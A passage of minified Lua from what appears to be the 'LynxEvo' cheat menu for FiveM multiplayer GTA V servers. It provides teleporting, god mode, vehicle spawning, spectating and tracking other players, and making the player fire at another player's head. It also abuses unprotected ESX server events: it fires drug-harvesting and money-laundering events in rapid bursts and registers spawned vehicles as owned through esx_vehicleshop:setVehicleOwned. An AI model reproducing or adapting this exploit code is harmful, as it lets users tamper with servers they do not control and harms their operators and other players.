while wp do Citizen.Wait(0)if wp then if IsPedInAnyVehicle(GetPlayerPed(-1),0)and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1)then entity=GetVehiclePedIsIn(GetPlayerPed(-1),0)else entity=GetPlayerPed(-1)end

SetEntityCoords(entity,WaypointCoords.x,WaypointCoords.y,height)FreezeEntityPosition(entity,true)local c8=GetEntityCoords(entity,true)if c7==0.0 then height=height-25.0

SetEntityCoords(entity,c8.x,c8.y,height)bool,c7=GetGroundZFor_3dCoord(c8.x,c8.y,c8.z,0)else SetEntityCoords(entity,c8.x,c8.y,c7)FreezeEntityPosition(entity,false)wp=false

height=1000.0

c7=0.0

au('~g~Teleported to waypoint!',false)break end end end end

local function c9()local ca=KeyboardInput('Enter Vehicle Spawn Name','',100)if ca and IsModelValid(ca)and IsModelAVehicle(ca)then RequestModel(ca)while not HasModelLoaded(ca)do Citizen.Wait(0)end

local veh=CreateVehicle(GetHashKey(ca),GetEntityCoords(PlayerPedId(-1)),GetEntityHeading(PlayerPedId(-1)),true,true)SetPedIntoVehicle(PlayerPedId(-1),veh,-1)else au('~b~~h~Model is not valid!',true)end end

local function cb()SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1),false))SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1),false),0.0)SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1),false),0)SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1),false),false)Citizen.InvokeNative(0x1FD09E7390A74D54,GetVehiclePedIsIn(GetPlayerPed(-1),false),0)SetVehicleUndriveable(vehicle,false)end

local function cc()SetVehicleEngineHealth(vehicle,1000)Citizen.InvokeNative(0x1FD09E7390A74D54,GetVehiclePedIsIn(GetPlayerPed(-1),false),0)SetVehicleUndriveable(vehicle,false)end

local function cd()LynxEvo.StartRC()end

LynxEvo.StartRC=function()if DoesEntityExist(LynxEvo.Entity)then return end

LynxEvo.SpawnRC()LynxEvo.Tablet(true)while DoesEntityExist(LynxEvo.Entity)and DoesEntityExist(LynxEvo.Driver)do Citizen.Wait(5)local ce=GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),GetEntityCoords(LynxEvo.Entity),true)LynxEvo.DrawInstructions(ce)LynxEvo.HandleKeys(ce)if ce<=3000.0 then if not NetworkHasControlOfEntity(LynxEvo.Driver)then NetworkRequestControlOfEntity(LynxEvo.Driver)elseif not NetworkHasControlOfEntity(LynxEvo.Entity)then NetworkRequestControlOfEntity(LynxEvo.Entity)end else TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,6,2500)end end end

LynxEvo.HandleKeys=function(ce)if IsControlJustReleased(0,47)then if IsCamRendering(LynxEvo.Camera)then LynxEvo.ToggleCamera(false)else LynxEvo.ToggleCamera(true)end end

if ce<=3.0 then if IsControlJustPressed(0,38)then LynxEvo.Attach('pick')end end

if ce<3000.0 then if IsControlPressed(0,172)and not IsControlPressed(0,173)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,9,1)end

if IsControlJustReleased(0,172)or IsControlJustReleased(0,173)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,6,2500)end

if IsControlPressed(0,173)and not IsControlPressed(0,172)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,22,1)end

if IsControlPressed(0,174)and IsControlPressed(0,173)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,13,1)end

if IsControlPressed(0,175)and IsControlPressed(0,173)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,14,1)end

if IsControlPressed(0,172)and IsControlPressed(0,173)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,30,100)end

if IsControlPressed(0,174)and IsControlPressed(0,172)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,7,1)end

if IsControlPressed(0,175)and IsControlPressed(0,172)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,8,1)end

if IsControlPressed(0,174)and not IsControlPressed(0,172)and not IsControlPressed(0,173)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,4,1)end

if IsControlPressed(0,175)and not IsControlPressed(0,172)and not IsControlPressed(0,173)then TaskVehicleTempAction(LynxEvo.Driver,LynxEvo.Entity,5,1)end

if IsControlJustReleased(0,168)then SetVehicleEngineOn(LynxEvo.Entity,not GetIsVehicleEngineRunning(LynxEvo.Entity),false,true)end end end

LynxEvo.DrawInstructions=function(ce)local cf={{['label']='Right',['button']='~INPUT_CELLPHONE_RIGHT~'},{['label']='Forward',['button']='~INPUT_CELLPHONE_UP~'},{['label']='Reverse',['button']='~INPUT_CELLPHONE_DOWN~'},{['label']='Left',['button']='~INPUT_CELLPHONE_LEFT~'}}local cg={['label']='Delete Car',['button']='~INPUT_CONTEXT~'}local ch={{['label']='Toggle Camera',['button']='~INPUT_DETONATE~'},{['label']='Start/Stop Engine',['button']='~INPUT_SELECT_CHARACTER_TREVOR~'}}if ce<=3000.0 then for cj=1,#cf do local ck=cf[cj]table.insert(ch,ck)end

if ce<=3000.0 then table.insert(ch,cg)end end

Citizen.CreateThread(function()local cl=RequestScaleformMovie('instructional_buttons')while not HasScaleformMovieLoaded(cl)do Wait(0)end

PushScaleformMovieFunction(cl,'CLEAR_ALL')PushScaleformMovieFunction(cl,'TOGGLE_MOUSE_BUTTONS')PushScaleformMovieFunctionParameterBool(0)PopScaleformMovieFunctionVoid()for cj,cm in ipairs(ch)do PushScaleformMovieFunction(cl,'SET_DATA_SLOT')PushScaleformMovieFunctionParameterInt(cj-1)PushScaleformMovieMethodParameterButtonName(cm['button'])PushScaleformMovieFunctionParameterString(cm['label'])PopScaleformMovieFunctionVoid()end

PushScaleformMovieFunction(cl,'DRAW_INSTRUCTIONAL_BUTTONS')PushScaleformMovieFunctionParameterInt(-1)PopScaleformMovieFunctionVoid()DrawScaleformMovieFullscreen(cl,255,255,255,255)end)end

LynxEvo.SpawnRC=function()local ca=KeyboardInput('Enter Vehicle Spawn Name','',100)if ca and IsModelValid(ca)and IsModelAVehicle(ca)then RequestModel(ca)while not HasModelLoaded(ca)do Citizen.Wait(0)end

LynxEvo.LoadModels({GetHashKey(ca),68070371})local cn,co=GetEntityCoords(PlayerPedId())+GetEntityForwardVector(PlayerPedId())*2.0,GetEntityHeading(PlayerPedId())LynxEvo.Entity=CreateVehicle(GetHashKey(ca),cn,co,true)while not DoesEntityExist(LynxEvo.Entity)do Citizen.Wait(5)end

LynxEvo.Driver=CreatePed(5,68070371,cn,co,true)SetEntityInvincible(LynxEvo.Driver,true)SetEntityVisible(LynxEvo.Driver,false)FreezeEntityPosition(LynxEvo.Driver,true)SetPedAlertness(LynxEvo.Driver,0.0)TaskWarpPedIntoVehicle(LynxEvo.Driver,LynxEvo.Entity,-1)while not IsPedInVehicle(LynxEvo.Driver,LynxEvo.Entity)do Citizen.Wait(0)end

LynxEvo.Attach('place')au('~g~~h~Success',false)else au('~b~~h~Model is not valid !',true)end end

LynxEvo.Attach=function(av)if not DoesEntityExist(LynxEvo.Entity)then return end

LynxEvo.LoadModels({'pickup_object'})if av=='place'then AttachEntityToEntity(LynxEvo.Entity,PlayerPedId(),GetPedBoneIndex(PlayerPedId(),28422),3.0,0.0,0.5,70.0,0.0,270.0,1,1,0,0,2,1)Citizen.Wait(200)DetachEntity(LynxEvo.Entity,false,true)PlaceObjectOnGroundProperly(LynxEvo.Entity)elseif av=='pick'then if DoesCamExist(LynxEvo.Camera)then LynxEvo.ToggleCamera(false)end

LynxEvo.Tablet(false)Citizen.Wait(100)DetachEntity(LynxEvo.Entity)DeleteVehicle(LynxEvo.Entity)DeleteEntity(LynxEvo.Driver)LynxEvo.UnloadModels()end end

LynxEvo.Tablet=function(cp)if cp then LynxEvo.LoadModels({GetHashKey('prop_cs_tablet')})LynxEvo.LoadModels({'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a'})Citizen.CreateThread(function()while DoesEntityExist(LynxEvo.TabletEntity)do Citizen.Wait(5)if not IsEntityPlayingAnim(PlayerPedId(),'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a','idle_a',3)then end end

ClearPedTasks(PlayerPedId())end)else DeleteEntity(LynxEvo.TabletEntity)end end

LynxEvo.ToggleCamera=function(cp)if not true then return end

if cp then if not DoesEntityExist(LynxEvo.Entity)then return end

if DoesCamExist(LynxEvo.Camera)then DestroyCam(LynxEvo.Camera)end

LynxEvo.Camera=CreateCam('DEFAULT_SCRIPTED_CAMERA',true)AttachCamToEntity(LynxEvo.Camera,LynxEvo.Entity,0.0,0.0,0.4,true)Citizen.CreateThread(function()while DoesCamExist(LynxEvo.Camera)do Citizen.Wait(5)SetCamRot(LynxEvo.Camera,GetEntityRotation(LynxEvo.Entity))end end)local cq=500*math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),GetEntityCoords(LynxEvo.Entity),true)/10)RenderScriptCams(1,1,cq,1,1)Citizen.Wait(cq)SetTimecycleModifier('scanline_cam_cheap')SetTimecycleModifierStrength(2.0)else local cq=500*math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),GetEntityCoords(LynxEvo.Entity),true)/10)RenderScriptCams(0,1,cq,1,0)Citizen.Wait(cq)ClearTimecycleModifier()DestroyCam(LynxEvo.Camera)end end

LynxEvo.LoadModels=function(cr)for cs=1,#cr do local bA=cr[cs]if not LynxEvo.CachedModels then LynxEvo.CachedModels={}end

table.insert(LynxEvo.CachedModels,bA)if IsModelValid(bA)then while not HasModelLoaded(bA)do RequestModel(bA)Citizen.Wait(10)end else while not HasAnimDictLoaded(bA)do RequestAnimDict(bA)Citizen.Wait(10)end end end end

LynxEvo.UnloadModels=function()for cs=1,#LynxEvo.CachedModels do local bA=LynxEvo.CachedModels[cs]if IsModelValid(bA)then SetModelAsNoLongerNeeded(bA)else RemoveAnimDict(bA)end end end

local function ct()local aw=GetPlayerPed(-1)local ax=GetVehiclePedIsIn(aw,true)local k=KeyboardInput('Enter the plate license you want','',100)if k~=''then SetVehicleNumberPlateText(ax,k)end end

function hweed()TriggerServerEvent('esx_drugs:startHarvestWeed')TriggerServerEvent('esx_drugs:startHarvestWeed')TriggerServerEvent('esx_drugs:startHarvestWeed')TriggerServerEvent('esx_drugs:startHarvestWeed')TriggerServerEvent('esx_drugs:startHarvestWeed')end

function tweed()TriggerServerEvent('esx_drugs:startTransformWeed')TriggerServerEvent('esx_drugs:startTransformWeed')TriggerServerEvent('esx_drugs:startTransformWeed')TriggerServerEvent('esx_drugs:startTransformWeed')TriggerServerEvent('esx_drugs:startTransformWeed')end

function sweed()TriggerServerEvent('esx_drugs:startSellWeed')TriggerServerEvent('esx_drugs:startSellWeed')TriggerServerEvent('esx_drugs:startSellWeed')TriggerServerEvent('esx_drugs:startSellWeed')TriggerServerEvent('esx_drugs:startSellWeed')end

function hcoke()TriggerServerEvent('esx_drugs:startHarvestCoke')TriggerServerEvent('esx_drugs:startHarvestCoke')TriggerServerEvent('esx_drugs:startHarvestCoke')TriggerServerEvent('esx_drugs:startHarvestCoke')TriggerServerEvent('esx_drugs:startHarvestCoke')end

function tcoke()TriggerServerEvent('esx_drugs:startTransformCoke')TriggerServerEvent('esx_drugs:startTransformCoke')TriggerServerEvent('esx_drugs:startTransformCoke')TriggerServerEvent('esx_drugs:startTransformCoke')TriggerServerEvent('esx_drugs:startTransformCoke')end

function scoke()TriggerServerEvent('esx_drugs:startSellCoke')TriggerServerEvent('esx_drugs:startSellCoke')TriggerServerEvent('esx_drugs:startSellCoke')TriggerServerEvent('esx_drugs:startSellCoke')TriggerServerEvent('esx_drugs:startSellCoke')end

function hmeth()TriggerServerEvent('esx_drugs:startHarvestMeth')TriggerServerEvent('esx_drugs:startHarvestMeth')TriggerServerEvent('esx_drugs:startHarvestMeth')TriggerServerEvent('esx_drugs:startHarvestMeth')TriggerServerEvent('esx_drugs:startHarvestMeth')end

function tmeth()TriggerServerEvent('esx_drugs:startTransformMeth')TriggerServerEvent('esx_drugs:startTransformMeth')TriggerServerEvent('esx_drugs:startTransformMeth')TriggerServerEvent('esx_drugs:startTransformMeth')TriggerServerEvent('esx_drugs:startTransformMeth')end

function smeth()TriggerServerEvent('esx_drugs:startSellMeth')TriggerServerEvent('esx_drugs:startSellMeth')TriggerServerEvent('esx_drugs:startSellMeth')TriggerServerEvent('esx_drugs:startSellMeth')TriggerServerEvent('esx_drugs:startSellMeth')end

function hopi()TriggerServerEvent('esx_drugs:startHarvestOpium')TriggerServerEvent('esx_drugs:startHarvestOpium')TriggerServerEvent('esx_drugs:startHarvestOpium')TriggerServerEvent('esx_drugs:startHarvestOpium')TriggerServerEvent('esx_drugs:startHarvestOpium')end

function topi()TriggerServerEvent('esx_drugs:startTransformOpium')TriggerServerEvent('esx_drugs:startTransformOpium')TriggerServerEvent('esx_drugs:startTransformOpium')TriggerServerEvent('esx_drugs:startTransformOpium')TriggerServerEvent('esx_drugs:startTransformOpium')end

function sopi()TriggerServerEvent('esx_drugs:startSellOpium')TriggerServerEvent('esx_drugs:startSellOpium')TriggerServerEvent('esx_drugs:startSellOpium')TriggerServerEvent('esx_drugs:startSellOpium')TriggerServerEvent('esx_drugs:startSellOpium')end

function mataaspalarufe()TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)TriggerServerEvent('esx_blanchisseur:startWhitening',85)end

function matanumaispalarufe()TriggerServerEvent('esx_drugs:stopHarvestCoke')TriggerServerEvent('esx_drugs:stopTransformCoke')TriggerServerEvent('esx_drugs:stopSellCoke')TriggerServerEvent('esx_drugs:stopHarvestMeth')TriggerServerEvent('esx_drugs:stopTransformMeth')TriggerServerEvent('esx_drugs:stopSellMeth')TriggerServerEvent('esx_drugs:stopHarvestWeed')TriggerServerEvent('esx_drugs:stopTransformWeed')TriggerServerEvent('esx_drugs:stopSellWeed')TriggerServerEvent('esx_drugs:stopHarvestOpium')TriggerServerEvent('esx_drugs:stopTransformOpium')TriggerServerEvent('esx_drugs:stopSellOpium')au('~b~Everything is now stopped.',false)end

local function cu()local ca=KeyboardInput('Enter Vehicle Spawn Name','',100)local cv=KeyboardInput('Enter Vehicle Licence Plate','',100)if ca and IsModelValid(ca)and IsModelAVehicle(ca)then RequestModel(ca)while not HasModelLoaded(ca)do Citizen.Wait(0)end

local veh=CreateVehicle(GetHashKey(ca),GetEntityCoords(PlayerPedId(-1)),GetEntityHeading(PlayerPedId(-1)),true,true)SetVehicleNumberPlateText(veh,cv)local cw=ESX.Game.GetVehicleProperties(veh)TriggerServerEvent('esx_vehicleshop:setVehicleOwned',cw)au('~g~~h~Success',false)else au('~b~~h~Model is not valid !',true)end end

function daojosdinpatpemata()local aw=GetPlayerPed(-1)local ax=GetVehiclePedIsIn(aw,true)if IsPedInAnyVehicle(GetPlayerPed(-1),0)and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1)then SetVehicleOnGroundProperly(ax)au('~g~Vehicle Flipped!',false)else au("~b~You Aren't In The Driverseat Of A Vehicle!",true)end end

function stringsplit(cx,cy)if cy==nil then cy='%s'end

local cz={}i=1

for cA in string.gmatch(cx,'([^'..cy..']+)')do cz[i]=cA

i=i+1 end

return cz end

local cB=false

function SpectatePlayer(cC)local aw=PlayerPedId(-1)cB=not cB

local cD=GetPlayerPed(cC)if cB then local cE,cF,cG=table.unpack(GetEntityCoords(cD,false))RequestCollisionAtCoord(cE,cF,cG)NetworkSetInSpectatorMode(true,cD)au('Spectating '..GetPlayerName(cC),false)else local cE,cF,cG=table.unpack(GetEntityCoords(cD,false))RequestCollisionAtCoord(cE,cF,cG)NetworkSetInSpectatorMode(false,cD)au('Stopped Spectating '..GetPlayerName(cC),false)end end

function ShootPlayer(cC)local head=GetPedBoneCoords(cC,GetEntityBoneIndexByName(cC,'SKEL_HEAD'),0.0,0.0,0.0)SetPedShootsAtCoord(PlayerPedId(-1),head.x,head.y,head.z,true)end

function MaxOut(veh)SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1),false),0)SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1),false),7)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),0,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),0)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),1,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),1)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),2,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),2)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),3,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),3)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),4,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),4)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),5,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),5)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),6,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),6)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),7,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),7)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),8,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),8)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),9,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),9)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),10,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),10)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),11,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),11)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),12,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),12)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),13,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),13)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),14,16,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),15,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),15)-2,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),16,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),16)-1,false)ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),17,true)ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),18,true)ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),19,true)ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),20,true)ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),21,true)ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),22,true)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),23,1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),24,1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),25,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),25)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),27,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),27)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),28,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),28)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),30,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),30)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),33,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),33)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),34,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),34)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),35,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),35)-1,false)SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1),false),38,GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1),false),38)-1,true)SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1),false),1)SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1),false),false)SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1),false),5)SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)),0,true)SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)),1,true)SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)),2,true)SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)),3,true)SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)),222,222,255)end

function DelVeh(veh)SetEntityAsMissionEntity(Object,1,1)DeleteEntity(Object)SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1),false),1,1)DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1),false))end

function Clean(veh)SetVehicleDirtLevel(veh,15.0)end

function Clean2(veh)SetVehicleDirtLevel(veh,1.0)end

function RequestControl(entity)local cH=0

NetworkRequestControlOfEntity(entity)while not NetworkHasControlOfEntity(entity)do cH=cH+100

Citizen.Wait(100)if cH>5000 then au('Hung for 5 seconds, killing to prevent issues...',true)end end end

function getEntity(cC)local k,entity=GetEntityPlayerIsFreeAimingAt(cC,Citizen.ReturnResultAnyway())return entity end

function GetInputMode()return Citizen.InvokeNative(0xA571D46727E2B718,2)and'MouseAndKeyboard'or'GamePad'end

function DrawSpecialText(cI,cJ)SetTextEntry_2('STRING')AddTextComponentString(cI)DrawSubtitleTimed(cJ,1)end

local cK=true

local cL=false

local cM=true

local cN=true

Citizen.CreateThread(function()while true do Wait(1)for I=0,128 do if NetworkIsPlayerActive(I)and GetPlayerPed(I)~=GetPlayerPed(-1)then ped=GetPlayerPed(I)blip=GetBlipFromEntity(ped)x1,y1,z1=table.unpack(GetEntityCoords(GetPlayerPed(-1),true))x2,y2,z2=table.unpack(GetEntityCoords(GetPlayerPed(I),true))distance=math.floor(GetDistanceBetweenCoords(x1,y1,z1,x2,y2,z2,true))headId=Citizen.InvokeNative(0xBFEFE3321A3F5015,ped,GetPlayerName(I),false,false,'',false)wantedLvl=GetPlayerWantedLevel(I)if cL then Citizen.InvokeNative(0x63BB75ABEDC1F6A0,headId,0,true)if wantedLvl then Citizen.InvokeNative(0x63BB75ABEDC1F6A0,headId,7,true)Citizen.InvokeNative(0xCF228E2AA03099C3,headId,wantedLvl)else Citizen.InvokeNative(0x63BB75ABEDC1F6A0,headId,7,false)end else Citizen.InvokeNative(0x63BB75ABEDC1F6A0,headId,7,false)Citizen.InvokeNative(0x63BB75ABEDC1F6A0,headId,9,false)Citizen.InvokeNative(0x63BB75ABEDC1F6A0,headId,0,false)end

if cK then if not DoesBlipExist(blip)then blip=AddBlipForEntity(ped)SetBlipSprite(blip,1)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,true)SetBlipNameToPlayerName(blip,I)else veh=GetVehiclePedIsIn(ped,false)blipSprite=GetBlipSprite(blip)if not GetEntityHealth(ped)then if blipSprite~=274 then SetBlipSprite(blip,274)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,false)SetBlipNameToPlayerName(blip,I)end elseif veh then vehClass=GetVehicleClass(veh)vehModel=GetEntityModel(veh)if vehClass==15 then if blipSprite~=422 then SetBlipSprite(blip,422)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,false)SetBlipNameToPlayerName(blip,I)end elseif vehClass==16 then if vehModel==GetHashKey('besra')or vehModel==GetHashKey('hydra')or vehModel==GetHashKey('lazer')then if blipSprite~=424 then SetBlipSprite(blip,424)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,false)SetBlipNameToPlayerName(blip,I)end elseif blipSprite~=423 then SetBlipSprite(blip,423)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,false)end elseif vehClass==14 then if blipSprite~=427 then SetBlipSprite(blip,427)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,false)end elseif vehModel==GetHashKey('insurgent')or vehModel==GetHashKey('insurgent2')or vehModel==GetHashKey('limo2')then if blipSprite~=426 then SetBlipSprite(blip,426)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,false)SetBlipNameToPlayerName(blip,I)end elseif vehModel==GetHashKey('rhino')then if blipSprite~=421 then SetBlipSprite(blip,421)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,false)SetBlipNameToPlayerName(blip,I)end elseif blipSprite~=1 then SetBlipSprite(blip,1)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,true)SetBlipNameToPlayerName(blip,I)end

passengers=GetVehicleNumberOfPassengers(veh)if passengers then if not IsVehicleSeatFree(veh,-1)then passengers=passengers+1 end

ShowNumberOnBlip(blip,passengers)else HideNumberOnBlip(blip)end else HideNumberOnBlip(blip)if blipSprite~=1 then SetBlipSprite(blip,1)Citizen.InvokeNative(0x5FBCA48327B914DF,blip,true)SetBlipNameToPlayerName(blip,I)end end

SetBlipRotation(blip,math.ceil(GetEntityHeading(veh)))SetBlipNameToPlayerName(blip,I)SetBlipScale(blip,0.85)if IsPauseMenuActive()then SetBlipAlpha(blip,255)else x1,y1=table.unpack(GetEntityCoords(GetPlayerPed(-1),true))x2,y2=table.unpack(GetEntityCoords(GetPlayerPed(I),true))distance=math.floor(math.abs(math.sqrt((x1-x2)*(x1-x2)+(y1-y2)*(y1-y2)))/-1)+900

if distance<0 then distance=0 elseif distance>255 then distance=255 end

SetBlipAlpha(blip,distance)end end else RemoveBlip(blip)end end end end end)local cO={__gc=function(cP)if cP.destructor and cP.handle then cP.destructor(cP.handle)end

cP.destructor=nil

cP.handle=nil end}function EnumerateEntities(cQ,cR,cS)return coroutine.wrap(function()local cT,I=cQ()if not I or I==0 then cS(cT)return end

local cP={handle=cT,destructor=cS}setmetatable(cP,cO)local cU=true

repeat coroutine.yield(I)cU,I=cR(cT)until not cU

cP.destructor,cP.handle=nil,nil

cS(cT)end)end

function EnumeratePeds()return EnumerateEntities(FindFirstPed,FindNextPed,EndFindPed)end

function EnumerateVehicles()return EnumerateEntities(FindFirstVehicle,FindNextVehicle,EndFindVehicle)end

function EnumerateObjects()return EnumerateEntities(FindFirstObject,FindNextObject,EndFindObject)end

function RotationToDirection(cV)local cW=cV.z*0.0174532924

local cX=cV.x*0.0174532924

local cY=math.abs(math.cos(cX))return vector3(-math.sin(cW)*cY,math.cos(cW)*cY,math.sin(cX))end

function OscillateEntity(entity,cZ,c_,d0,d1)if entity~=0 and entity~=nil then local d2=(c_-cZ)*d0*d0-2.0*d0*d1*GetEntityVelocity(entity)ApplyForceToEntity(entity,3,d2.x,d2.y,d2.z+0.1,0.0,0.0,0.0,false,false,true,true,false,true)end end

local d3=true

Citizen.CreateThread(function()while bv do Citizen.Wait(0)SetPlayerInvincible(PlayerId(),Godmode)SetEntityInvincible(PlayerPedId(-1),Godmode)SetEntityVisible(GetPlayerPed(-1),d3,0)if SuperJump then SetSuperJumpThisFrame(PlayerId(-1))end

if InfStamina then RestorePlayerStamina(PlayerId(-1),1.0)end

if fastrun then SetRunSprintMultiplierForPlayer(PlayerId(-1),2.49)SetPedMoveRateOverride(GetPlayerPed(-1),2.15)else SetRunSprintMultiplierForPlayer(PlayerId(-1),1.0)SetPedMoveRateOverride(GetPlayerPed(-1),1.0)end

if VehicleGun then local d4='Freight'local b_=GetEntityCoords(GetPlayerPed(-1),true)if IsPedInAnyVehicle(GetPlayerPed(-1),true)==false then au('~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!',false)GiveWeaponToPed(GetPlayerPed(-1),GetHashKey('WEAPON_APPISTOL'),999999,false,true)SetPedAmmo(GetPlayerPed(-1),GetHashKey('WEAPON_APPISTOL'),999999)if GetSelectedPedWeapon(GetPlayerPed(-1))==GetHashKey('WEAPON_APPISTOL')then if IsPedShooting(GetPlayerPed(-1))then while not HasModelLoaded(GetHashKey(d4))do Citizen.Wait(0)RequestModel(GetHashKey(d4))end

